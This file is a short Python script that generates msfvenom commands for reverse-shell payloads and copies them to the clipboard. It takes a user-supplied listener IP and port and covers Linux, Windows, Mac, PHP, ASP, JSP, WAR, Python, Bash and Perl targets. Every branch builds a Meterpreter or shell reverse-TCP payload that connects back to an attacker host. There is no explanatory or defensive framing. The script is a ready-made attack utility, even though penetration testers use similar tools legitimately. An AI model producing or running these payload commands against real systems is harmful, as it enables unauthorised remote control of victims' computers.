from pynput.keyboard import Key, Controller
import pyperclip

keyboard = Controller()
print("(!) This script allows you to rapidly generate Reverse TCP exploits via msfvenom.")
print("-" * 60)
ipAddress = raw_input("(?) What is your desired IP address? ")
print("-" * 60)
port = raw_input("(?) What is your desired Port? ")
print("-" * 60)


payloadType = raw_input("(?) Linux, Windows, Mac, PHP, ASP, JSP, WAR, Python, Bash, Perl? ")
payloadTypeNew = payloadType.lower()

if payloadTypeNew == "linux" or payloadTypeNew == "lin":
    pyperclip.copy("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f elf > payload.elf")
    print("(+) Linux Reverse Shell Generated!")

elif payloadTypeNew == "windows" or payloadTypeNew == "win" or payloadTypeNew == "window":
    pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f exe > payload.exe")
    print("(+) Windows Reverse Shell Generated!")

elif payloadTypeNew == "mac":
    pyperclip.copy("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f macho > payload.macho")
    print("(+) Mac Reverse Shell Generated!")

elif payloadTypeNew == "php":
    pyperclip.copy("msfvenom -p php/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.php")
    print("(+) PHP Reverse Shell Generated!")

elif payloadTypeNew == "asp":
    pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f asp > payload.asp")
    print("(+) ASP Reverse Shell Generated!")

elif payloadTypeNew == "jsp":
    pyperclip.copy("msfvenom -p jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.jsp")
    print("(+) JSP Reverse Shell Generated!")

elif payloadTypeNew == "war":
    pyperclip.copy("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f war > payload.war")
    print("(+) WAR Reverse Shell Generated!")

elif payloadTypeNew == "python" or payloadTypeNew == "py":
    pyperclip.copy("msfvenom -p cmd/unix/reverse_python LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.py")
    print("(+) Python Reverse Shell Generated!")

elif payloadTypeNew == "bash":
    pyperclip.copy("msfvenom -p cmd/unix/reverse_bash LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.sh")
    print("(+) Bash Reverse Shell Generated!")

elif payloadTypeNew == "perl":
    pyperclip.copy("msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")
    print("(+) Perl Reverse Shell Generated!")

else:
    print("(-) Unrecognised file type, please try again!")

print("-" * 60)
print("(*) The Requested Script Has Been Copied To Your Clipboard")